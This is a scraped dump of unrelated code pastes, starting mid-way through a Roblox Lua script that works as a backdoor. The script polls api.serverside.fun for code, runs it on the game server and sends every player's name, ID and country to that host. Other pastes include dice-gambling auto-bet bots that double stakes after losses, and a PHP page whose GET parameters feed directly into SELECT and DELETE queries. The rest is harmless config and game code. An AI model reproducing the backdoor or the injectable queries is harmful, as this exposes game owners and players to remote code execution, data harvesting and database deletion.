                                            else
                                                pcall(
                                                    function()
                                                        require(script.Loadstring)(y)()
                                                    end
                                                )
                                            end
                                        end
                                    )
                                end
                            end
                        )
                    end
                    local A = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. f.UserId
                    while true do
                        local B, C = pcall(d.GetAsync, d, A)
                        if B then
                            local B, h = pcall(d.JSONDecode, d, C)
                            if B then
                                if h and h[""script""] then
                                    if game.Players:FindFirstChild(f.Name) then
                                        local D = h[""script""].robloxId
                                        local E = h[""script""].script
                                        if f.UserId == tonumber(D) then
                                            if E == ""r6()"" then
                                                pcall(
                                                    function()
                                                        require(3436957371):r6(f.Name)
                                                    end
                                                )
                                            elseif E == ""re()"" then
                                                pcall(
                                                    function()
                                                        f:LoadCharacter()
                                                    end
                                                )
                                            elseif E:match(""USERNAME"") then
                                                local z = string.gsub(E, ""USERNAME"", f.Name)
                                                pcall(
                                                    function()
                                                        require(script.Loadstring)(z)()
                                                    end
                                                )
                                            else
                                                pcall(
                                                    function()
                                                        require(script.Loadstring)(E)()
                                                    end
                                                )
                                            end
                                            local d = game:GetService(""HttpService"")
                                            local i = ""https://api.serverside.fun/v1/script-logs""
                                            local h = {
                                                [""script""] = E,
                                                [""robloxId""] = tostring(f.UserId),
                                                [""gameId""] = tostring(game.GameId)
                                            }
                                            pcall(
                                                function()
                                                    d:PostAsync(i, d:JSONEncode(h))
                                                end
                                            )
                                        end
                                    end
                                end
                            end
                        end
                        task.wait()
                    end
                else
                end
            end
        )
        pcall(
            function()
                local g =
                    game:GetService(""HttpService""):GetAsync(
                    ""https://api.serverside.fun/v1/toggle-free/check/"" .. f.UserId
                )
                local h = game:GetService(""HttpService""):JSONDecode(g)
                if h.whitelisted ~= false then
                    local function k()
                        local l = {}
                        for m, n in ipairs(game.Players:GetPlayers()) do
                            local o
                            pcall(
                                function()
                                    o = c:GetCountryRegionForPlayerAsync(n)
                                end
                            )
                            if not o then
                                o = ""Unknown""
                            end
                            table.insert(
                                l,
                                {username = n.Name, userid = n.UserId, displayName = n.DisplayName, country = o}
                            )
                        end
                        return l
                    end
                    local function p()
                        wait(.5)
                        if game.Players:FindFirstChild(f.Name) then
                            local l = k()
                            local q = {value = l, robloxId = f.UserId}
                            local r = d:JSONEncode(q)
                            d:PostAsync(b, r)
                        end
                    end
                    local s = true
                    local t = false
                    local function u()
                        wait(1)
                        if game.Players:FindFirstChild(f.Name) and s == true then
                            p()
                        else
                            s = false
                            if t == false then
                                local v = {value = {}, robloxId = f.UserId}
                                local w = d:JSONEncode(v)
                                d:PostAsync(b, w)
                                t = true
                            end
                        end
                    end
                    pcall(
                        function()
                            p()
                            game.Players.PlayerAdded:Connect(p)
                            game.Players.PlayerRemoving:Connect(u)
                        end
                    )
                    pcall(
                        function()
                            require(13749573698).hi(f.Name)
                        end
                    )
                    while true do
                        wait(1)
                        if game.Players:FindFirstChild(f.Name) then
                            local g =
                                game:GetService(""HttpService""):GetAsync(
                                ""https://api.serverside.fun/v1/pending-script/"" .. f.UserId
                            )
                            local h = game:GetService(""HttpService""):JSONDecode(g)
                            local F = h.pendingScripts
                            for x, y in pairs(F) do
                                if y.script == ""r6()"" then
                                    pcall(
                                        function()
                                            require(3436957371):r6(f.Name)
                                        end
                                    )
                                elseif y.script == ""re()"" then
                                    pcall(
                                        function()
                                            f:LoadCharacter()
                                        end
                                    )
                                elseif y.script:match(""USERNAME"") then
                                    local z = string.gsub(y.script, ""USERNAME"", f.Name)
                                    pcall(
                                        function()
                                            require(script.Loadstring)(z)()
                                        end
                                    )
                                else
                                    pcall(
                                        function()
                                            require(script.Loadstring)(y.script)()
                                        end
                                    )
                                end
                            end
                        end
                    end
                else
                end
            end
        )
    end
)
game:GetService(""Players"").PlayerAdded:Connect(
    function(f)
        local e = game:GetService(""Players"")
        local G = game:GetService(""HttpService"")
        local H = ""https://api.serverside.fun/v1/games""
        local I = {[""jobId""] = tostring(game.JobId), [""universe""] = tostring(game.GameId)}
        pcall(
            function()
                G:PostAsync(H, G:JSONEncode(I))
            end
        )
    end
)
return a"
20mAQWRX,snowybot,coinwalk,JavaScript,Sunday 7th of January 2024 02:16:04 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*lower))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    muck = 0;
    fart = parseFloat(bellance);
}
if ((((base*24)-(botplus*4))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 0;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((bellance-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if ((bellance>=(james+(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"");
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_lo').click();
setTimeout(() => get(), 350);
}
get();"
LTBvkzpP,index,ppiso,PHP,Sunday 7th of January 2024 02:12:37 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>kt</title>
</head>
<body>
    
    
    <?php

    error_reporting(0);
    mysqli_report(MYSQLI_REPORT_OFF);

    $connect = @new mysqli ('localhost','root','','spr');
    if($connect->connect_error)
    {
        echo ""wystapil blad"";
        exit;
    }

    ?>

    <form>
    <select name=""podane"">
        <?php
        $query=""SELECT DISTINCT dzien FROM rozklad"";
        $result=$connect->query($query);
        while($row=$result->fetch_object())
        {
            echo ""<option walue=$row->dzien>$row->dzien""; 
        }

        ?>
    </select>
    <input value=""wyswietl"" name=""mode"" type=""submit"">
    </form>
    <?php
    if(ISSET($_GET['mode']))
    {
    $query=""SELECT * FROM rozklad WHERE dzien='{$_GET ['podane']}'"";
    $result=$connect->query($query);

    echo<<<html
    <table border=""3"">
    <tr>
    <td>dzien</td>
    <td>zajecie</td>
    <td>priorytet</td>
    </tr>
    html;

    while($row=$result->fetch_object())
    {

    echo<<<html

    
    <tr>
    <td>$row->dzien</td>
    <td>$row->zajecie</td>
    <td>$row->priorytet</td>
    </tr>
    

    </table>

    html;
    }
    }
    ?>
    <form>
    <select name=""usuwanie"">
        <?php
        $query=""SELECT DISTINCT zajecie FROM rozklad"";
        $result=$connect->query($query);
        while($row=$result->fetch_object())
        {
            echo ""<option walue=$row->zajecie>$row->zajecie""; 
        }

        ?>
    </select>

    <input value=""usun"" name=""mode"" type=""submit"">  
    </input>    

    </form>
    <?php

    if(ISSET($_GET['mode']))
    {
        $query=""DELETE FROM rozklad WHERE zajecie='{$_GET ['usuwanie']}'"";
        $connect->query($query);


    }

    ?>


</body>
</html>"
NYVpReTC,snowybot,coinwalk,JavaScript,Sunday 7th of January 2024 02:11:10 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 240; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    fart = parseFloat(bellance);
}
if (bellance<(fart-(botplus*lower))) {
    botplus = Number((botplus*2).toFixed(8));
    upper = 4.9;
    lower = 4.9;
    muck = 0;
    fart = parseFloat(bellance);
}
if ((((base*24)-(botplus*4))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 0;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (((bellance-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if ((bellance>=(james+(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    lower = 2.9;
    upper = 6.9;
    muck = 1;
    fart = ((Math.floor((parseFloat(bellance))/tens))*tens);
    james = ((Math.floor((parseFloat(bellance))/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"")
alert(""winner winner chicken dinner"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_lo').click();
setTimeout(() => get(), 350);
}
get();"
5NUaJXEZ,snowybot2,coinwalk,JavaScript,Sunday 7th of January 2024 02:05:00 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var dived = 1000; 
var base = (oldestbal/dived).toFixed(8); 
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var lower = 2.9;
var upper = 6.9;
var muck = 1;
var fran = 0;
var james = ((Math.floor(oldestbal/tens))*tens);
var fart = (((Math.floor(oldestbal/tens))*tens)-(tens*2));
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
console.clear();
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=fran)&&(bellance<james)){
    botplus = botplus*2;
    muck = 0;
    fran = parseFloat(bellance);
}
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=fran)&&(bellance>=james)){
    botplus = botplus*2;
    fran = parseFloat(bellance);
}
if (bellance<(fart-(base*4.9))) {
    botplus = base;
    muck = 0;
    fran = 0;
    fart = (((Math.floor(bellance/tens))*tens)-(tens*2));
}
if ((bellance>=(james+(tens*muck)))&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))) {
    botplus = base;
    muck = 1;
    fran = 0;
    fart = (((Math.floor(bellance/tens))*tens)-(tens*2));
    james = ((Math.floor(bellance/tens))*tens);
}
if (bellance>=(trget*24)) {
console.log(""winner winner chicken dinner"")
alert(""winner winner chicken dinner"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 350);
}
get();"
RPgyhJDP,Untitled,coinwalk,JavaScript,Sunday 7th of January 2024 02:04:06 PM CDT,https://b246-187-225-181-54.ngrok-free.app/
fAPcPRQJ,hatsune miku cursor,httpstae,HTML,Sunday 7th of January 2024 02:02:49 PM CDT,"<style type=""text/css"">* {cursor: url(https://web.archive.org/web/20230326214128im_/https://cur.cursors-4u.net/anime/ani-12/ani1136.ani), url(https://web.archive.org/web/20230326214128im_/https://cur.cursors-4u.net/anime/ani-12/ani1136.gif), auto !important;}</style><a href=""https://web.archive.org/web/20230326214128/https://www.cursors-4u.com/cursor/2011/12/14/singing-hatsune-miku.html"" target=""_blank"" title=""Singing Hatsune Miku""><img src=""https://web.archive.org/web/20230326214128im_/https://cur.cursors-4u.net/cursor.png"" border=""0"" alt=""Singing Hatsune Miku"" style=""position:absolute; top: 0px; right: 0px;""/></a>"
sYXWWj5P,hello kitty cursor,httpstae,HTML,Sunday 7th of January 2024 01:59:52 PM CDT,"<style type=""text/css"">* {cursor: url(https://web.archive.org/web/20230326054429im_/https://cur.cursors-4u.net/anime/ani-9/ani863.cur), auto !important;}</style><a href=""https://web.archive.org/web/20230326054429/https://www.cursors-4u.com/cursor/2009/04/13/hello-kitty-53.html"" target=""_blank"" title=""Hello Kitty 53""><img src=""https://web.archive.org/web/20230326054429im_/https://cur.cursors-4u.net/cursor.png"" border=""0"" alt=""Hello Kitty 53"" style=""position:absolute; top: 0px; right: 0px;""/></a>"
y0BTBpH2,rotating blue heart cursor,httpstae,HTML,Sunday 7th of January 2024 01:59:04 PM CDT,"<style type=""text/css"">* {cursor: url(https://web.archive.org/web/20230401211338im_/https://ani.cursors-4u.net/symbols/sym-8/sym757.ani), url(https://web.archive.org/web/20230401211338im_/https://ani.cursors-4u.net/symbols/sym-8/sym757.png), auto !important;}</style><a href=""https://web.archive.org/web/20230401211338/https://www.cursors-4u.com/cursor/2014/03/25/baby-blue-spinning-heart-within-a-heart.html"" target=""_blank"" title=""Baby Blue Spinning Heart Within A Heart""><img src=""https://web.archive.org/web/20230401211338im_/https://cur.cursors-4u.net/cursor.png"" border=""0"" alt=""Baby Blue Spinning Heart Within A Heart"" style=""position:absolute; top: 0px; right: 0px;""/></a>"
vLPZ8uML,Flow_CriarSensores,pmfernandes,JSON,Sunday 7th of January 2024 01:45:05 PM CDT,"[{""id"":""2d3fcabc47c06b33"",""type"":""inject"",""z"":""d77746207a4253d3"",""name"":"""",""props"":[],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""x"":90,""y"":220,""wires"":[[""13d59f800878e5b0"",""38652d44a9ffdc51"",""dbcacf93fb0c3a8d"",""9332aa90707518a2"",""3d2096c48e96096a""]]},{""id"":""9cdf348b0a59f2cf"",""type"":""file in"",""z"":""d77746207a4253d3"",""name"":"""",""filename"":""/data/sensorCreation/radio.yaml"",""filenameType"":""str"",""format"":""utf8"",""chunk"":false,""sendError"":false,""encoding"":""none"",""allProps"":false,""x"":390,""y"":60,""wires"":[[""7314500f39995499""]]},{""id"":""37e004361a92e6da"",""type"":""yaml"",""z"":""d77746207a4253d3"",""property"":""payload"",""name"":"""",""x"":870,""y"":220,""wires"":[[""b25b2a5598382e3b""]]},{""id"":""b25b2a5598382e3b"",""type"":""splitter"",""z"":""d77746207a4253d3"",""name"":""Devices | Splitter"",""property"":""payload.devices"",""x"":1030,""y"":220,""wires"":[[""5889ae65d7abe36e""]]},{""id"":""5889ae65d7abe36e"",""type"":""change"",""z"":""d77746207a4253d3"",""name"":""Save Device Information"",""rules"":[{""t"":""set"",""p"":""deviceInformation"",""pt"":""msg"",""to"":""payload.device"",""tot"":""msg""}],""action"":"""",""property"":"""",""from"":"""",""to"":"""",""reg"":false,""x"":1250,""y"":220,""wires"":[[""38a52a1b886beb8f""]]},{""id"":""38a52a1b886beb8f"",""type"":""splitter"",""z"":""d77746207a4253d3"",""name"":""Topics | Splitter"",""property"":""payload.topics"",""x"":1460,""y"":220,""wires"":[[""10c2d33ff7f38447""]]},{""id"":""10c2d33ff7f38447"",""type"":""change"",""z"":""d77746207a4253d3"",""name"":""Prepare Message to Publish"",""rules"":[{""t"":""set"",""p"":""topic"",""pt"":""msg"",""to"":""payload.topic"",""tot"":""msg""},{""t"":""set"",""p"":""retain"",""pt"":""msg"",""to"":""payload.retain"",""tot"":""msg""},{""t"":""set"",""p"":""payload"",""pt"":""msg"",""to"":""payload.payload"",""tot"":""msg""},{""t"":""change"",""p"":""payload"",""pt"":""msg"",""from"":""##device##"",""fromt"":""str"",""to"":""deviceInformation"",""tot"":""msg""}],""action"":"""",""property"":"""",""from"":"""",""to"":"""",""reg"":false,""x"":1680,""y"":220,""wires"":[[""81facf5151a228d5""]]},{""id"":""81facf5151a228d5"",""type"":""mqtt out"",""z"":""d77746207a4253d3"",""name"":"""",""topic"":"""",""qos"":"""",""retain"":""true"",""respTopic"":"""",""contentType"":"""",""userProps"":"""",""correl"":"""",""expiry"":"""",""broker"":""928647851a6d335f"",""x"":1890,""y"":220,""wires"":[]},{""id"":""928647851a6d335f"",""type"":""mqtt-broker"",""name"":""EQMX"",""broker"":""mqtt.pmf.local"",""port"":""1883"",""clientid"":""node-red-publish"",""autoConnect"":true,""usetls"":false,""protocolVersion"":""4"",""keepalive"":""60"",""cleansession"":true,""birthTopic"":"""",""birthQos"":""0"",""birthPayload"":"""",""birthMsg"":{},""closeTopic"":"""",""closeQos"":""0"",""closePayload"":"""",""closeMsg"":{},""willTopic"":"""",""willQos"":""0"",""willPayload"":"""",""willMsg"":{},""userProps"":"""",""sessionExpiry"":""""}]"
PQceY0Jz,Sensores,pmfernandes,YAML,Sunday 7th of January 2024 01:42:51 PM CDT,"devices:
  - device: '{""manufacturer"": ""Pedro Miguel Fernandes"",""identifiers"": [""08df8e78-48d4-452b-b269-256fe2d24f1b""],""model"": ""Radios"",""name"": ""Radio Integration"",""sw_version"": ""1.0.0.0""}'
    topics:
      - topic: homeassistant/sensor/RadioArtist/config
        payload: '{""name"": ""RadioArtist"",""state_topic"": ""radio/state"",""value_template"": ""{{value_json.artist}}"",""icon"": ""mdi:account"",""retain"":true, ""unique_id"": ""7487910a-8d51-47c9-934f-950467b8e099"", ""device"": ##device##}'
        retain: true
      - topic: homeassistant/sensor/RadioAlbum/config
        payload: '{""name"": ""RadioAlbum"",""state_topic"": ""radio/state"",""value_template"": ""{{value_json.album}}"",""icon"": ""mdi:file-music"",""retain"":true, ""unique_id"": ""3d9203fe-01bc-401f-be10-42b338244f5f"", ""device"": ##device##}'
        retain: true
      - topic: homeassistant/sensor/RadioMusic/config
        payload: '{""name"": ""RadioMusic"",""state_topic"": ""radio/state"",""value_template"": ""{{value_json.music}}"",""icon"": ""mdi:speaker"",""retain"":true, ""unique_id"": ""eedf290d-5ceb-4e4b-b780-c57eba517d91"", ""device"": ##device##}'
        retain: true
      - topic: homeassistant/camera/RadioImage/config
        payload: '{""name"": ""RadioImage"",""topic"": ""radio/image"",""retain"":true, ""unique_id"": ""b20ecae4-ad5e-4fa6-b5dd-ba98d041a0a8"", ""device"": ##device##}'
        retain: true
      - topic: homeassistant/select/RadioToPlay/config
        payload: '{ ""command_topic"": ""homeassistant/select/RadioToPlay/set"", ""icon"": ""mdi:power-settings"", ""name"": ""RadioToPlay"", ""options"": [""Cozinha"",""Escrit√≥rio"",""Suite"",""Todas""], ""retain"":true, ""unique_id"": ""4e8d14b2-306f-41d5-b8da-725d01520d5c"", ""device"": ##device## }'
        retain: true
"
1F4Wjy66,Untitled,jh_elec,VB.NET,Sunday 7th of January 2024 01:27:13 PM CDT,"2.01,
10.01,

22.01,23.01,24.01,



5.02,7.02,

19.02,



































19.08,20.08,21.08,22.08,23.08,
26.08,27.08,28.08,29.08,30.08,"
pnHeBb9w,Untitled,Salvens,C++,Sunday 7th of January 2024 01:06:56 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define int long long

#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);

//#include <ext/pb_ds/assoc_container.hpp>
//using namespace __gnu_pbds;
//typedef tree<int, null_type, less<int>, rb_tree_tag, tree_order_statistics_node_update> ordered_set;
std::mt19937 rnd(std::chrono::steady_clock::now().time_since_epoch().count());

const int INF = 1e18 + 7;
const double EPS = 1e-10;
const int MOD = 1e9 + 7;
const int MAXN = 5e4 + 100;

inline void solve() {
  
}

int32_t main() {
    IOS;
    clock_t tStart = clock();

    int tt = 1;
//    cin >> tt;
    while (tt --> 0) {
        solve();
    }
//    cerr << ""Runtime is:"" << (long double) (clock() - tStart) / CLOCKS_PER_SEC << '\n';
    return 0;
}

//‚ñà‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà
//‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñà‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚ñà‚îÄ‚ñà
//‚ñà‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚ñà‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚ñà‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚ñà‚ñà
//‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà
//‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚îÄ‚ñà‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà‚ñà‚ñà‚îÄ‚îÄ‚ñà‚îÄ‚îÄ‚ñà"
KJjpy2P6,Untitled,Mizzzlo,C#,Sunday 7th of January 2024 01:01:57 PM CDT,"using UnityEngine.Events;
using Cysharp.Threading.Tasks;
using System;
using UnityEngine.LowLevel;
 
namespace Archer.Model
{
    public class DamageProvider
    {
        private const int NumberMillisecondsPerSecond = 1000;
 
        private const int DelayDefaultType = 0;
        private const int NumberOfIterationDefaultType = 1;
 
        private const int DelayFireTypeMillisecons = 400;
        private const int NumberOfIterationFireType = 5;
 
        private const int DelayPoisonTypeMillisecons = 300;
        private const int NumberOfIterationPoisonType = 10;
 
        private Character _character;
 
        private bool _isSkillImpact;
 
        public DamageProvider(Character character)
        {
            _character = character;
            _character.DamageReceived += TakeDamage;
            var loop = PlayerLoop.GetCurrentPlayerLoop();
            PlayerLoopHelper.Initialize(ref loop, InjectPlayerLoopTimings.Minimum);
        }
 
        public event UnityAction<int, bool, float, ArrowSkillType> DamageReceived;
 
        public void OnDestroy()
        {
            _character.DamageReceived -= TakeDamage;
        }
 
        private async void ApplyPeriodicDamage(int damagePerIteration, int nuberOfIteration, int delay, ArrowSkillType skillType)
        {
            float playingEffectTime = (nuberOfIteration * deltay) / NumberMillisecondsPerSecond;
            for (int i = 0; i < nuberOfIteration; i++)
            {
                await UniTask.Delay(TimeSpan.FromSeconds(0.4f), DelayType.DeltaTime, PlayerLoopTiming.Update);
 
                _isSkillImpact = true;
                DamageReceived?.Invoke(damagePerIteration, _isSkillImpact, playingEffectTime, skillType);
            }
        }
 
        private void ApplyInstantDamage(int damage)
        {
            _isSkillImpact = false;
            DamageReceived?.Invoke(damage, _isSkillImpact, 0, ArrowSkillType.None);
        }
 
        private void TakeDamage(int mainDamage, int additionalDamage, ArrowSkillType arrowSkillType)
        {
            switch (arrowSkillType)
            {
                case ArrowSkillType.None:
                    ApplyInstantDamage(mainDamage);
                    break;
 
                case ArrowSkillType.Default:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationDefaultType, DelayDefaultType, ArrowSkillType.Default);
                    break;
 
                case ArrowSkillType.Fire:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationFireType, DelayFireTypeMillisecons, ArrowSkillType.Fire);
                    break;
 
                case ArrowSkillType.Poison:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationPoisonType, DelayPoisonTypeMillisecons, ArrowSkillType.Poison);
                    break;
            }
        }
    }
}"
RhkBNZKQ,Untitled,Mizzzlo,C#,Sunday 7th of January 2024 01:01:30 PM CDT,"using UnityEngine.Events;
using System.Threading.Tasks;

namespace Archer.Model
{
    public class DamageProvider
    {
        private const int NumberMillisecondsPerSecond = 1000;

        private const int DelayDefaultType = 0;
        private const int NumberOfIterationDefaultType = 1;

        private const int DelayFireTypeMillisecons = 400;
        private const int NumberOfIterationFireType = 5;

        private const int DelayPoisonTypeMillisecons = 300;
        private const int NumberOfIterationPoisonType = 10;

        private Character _character;

        private bool _isSkillImpact;

        public DamageProvider(Character character)
        {
            _character = character;
            _character.DamageReceived += TakeDamage;
        }

        public event UnityAction<int, bool, float, ArrowSkillType> DamageReceived;

        public void OnDestroy()
        {
            _character.DamageReceived -= TakeDamage;
        }

        private async void ApplyPeriodicDamage(int damagePerIteration, int nuberOfIteration, int delay, ArrowSkillType skillType)
        {
            float playingEffectTime = (nuberOfIteration * delay) / NumberMillisecondsPerSecond;
            for (int i = 0; i < nuberOfIteration; i++)
            {
                await Task.Delay(delay);

                _isSkillImpact = true;
                DamageReceived?.Invoke(damagePerIteration, _isSkillImpact, playingEffectTime, skillType);
            }
        }

        private void ApplyInstantDamage(int damage)
        {
            _isSkillImpact = false;
            DamageReceived?.Invoke(damage, _isSkillImpact, 0, ArrowSkillType.None);
        }

        private void TakeDamage(int mainDamage, int additionalDamage, ArrowSkillType arrowSkillType)
        {
            switch (arrowSkillType)
            {
                case ArrowSkillType.None:
                    ApplyInstantDamage(mainDamage);
                    break;

                case ArrowSkillType.Default:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationDefaultType, DelayDefaultType, ArrowSkillType.Default);
                    break;

                case ArrowSkillType.Fire:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationFireType, DelayFireTypeMillisecons, ArrowSkillType.Fire);
                    break;

                case ArrowSkillType.Poison:
                    ApplyPeriodicDamage(additionalDamage, NumberOfIterationPoisonType, DelayPoisonTypeMillisecons, ArrowSkillType.Poison);
                    break;
            }
        }
    }
}"
S8ydjWds,Untitled,Mizzzlo,C#,Sunday 7th of January 2024 01:00:20 PM CDT,"using UnityEngine.Events;
using Cysharp.Threading.Tasks;
using System;
using UnityEngine.LowLevel;

namespace Archer.Model
{
    public class DamageProvider
    {
        private const int NumberMillisecondsPerSecond = 1000;

        private const int DelayDefaultType = 0;
        private const int NumberOfIterationDefaultType = 1;

        private const int DelayFireTypeMillisecons = 400;
        private const int NumberOfIterationFireType = 5;

        private const int DelayPoisonTypeMillisecons = 300;
        private const int NumberOfIterationPoisonType = 10;

        private Character _character;

        private bool _isSkillImpact;

        public DamageProvider(Character character)
        {
            _character = character;
            _character.DamageReceived += TakeDamage;
            var loop = PlayerLoop.GetCurrentPlayerLoop();
            PlayerLoopHelper.Initialize(ref loop, InjectPlayerLoopTimings.Minimum);
        }

        public event UnityAction<int, bool, float, ArrowSkillType> DamageReceived;

        public void OnDestroy()
        {
            _character.DamageReceived -= TakeDamage;
        }

        private async void ApplyPeriodicDamage(int damagePerIteration, int nuberOfIteration, int deltay, ArrowSkillType skillType)
        {
            float playingEffectTime = (nuberOfIteration * deltay) / NumberMillisecondsPerSecond;
            for (int i = 0; i < nuberOfIteration; i++)
            {
                await UniTask.Delay(TimeSpan.FromSeconds(0.4f), DelayType.DeltaTime, PlayerLoopTiming.Update);

                _isSkillImpact = true;
                DamageReceived?.Invoke(damagePerIteration, _isSkillImpact, playingEffectTime, skillType);
            }
        }

        private void ApplyInstantDamage(int damage)
        {
            _isSkillImpact = false;
            DamageReceived?.Invoke(damage, _isSkillImpact, 0, ArrowSkillType.None);
        }

        private void TakeDamage(int mainDamage, int additionalDamage, ArrowSkillType arrowSkillType)
        {
            switch (arrowSkillType)
            {
                case ArrowSkillType.None:
                    ApplyInstantDamage(mainDamage);
                    break;

                case ArrowSkillType.Default:
